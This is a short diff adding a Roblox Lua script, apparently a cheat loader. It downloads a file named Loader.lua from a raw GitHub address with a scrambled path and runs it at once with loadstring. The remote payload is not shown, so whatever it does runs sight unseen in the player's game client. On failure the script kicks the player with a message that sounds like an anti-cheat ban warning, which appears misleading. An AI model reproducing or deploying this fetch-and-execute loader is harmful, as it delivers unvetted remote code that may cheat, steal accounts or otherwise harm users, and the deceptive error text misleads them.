@@ -1,0 +1,9 @@
+local scrip_t = "https://raw.githubusercontent.com/no1setz2/l431-043-5-1-oadR3O-PA-TS-ArerD-Uq2345-q4-5-145/refs/heads/main/Loader.lua"
+
+local s, err = pcall(function()
+    loadstring(game:HttpGet(scrip_t))()
+end)
+
+if not s then
+    game.Players.LocalPlayer:Kick("Rac ban potential: " .. tostring(err))
+end
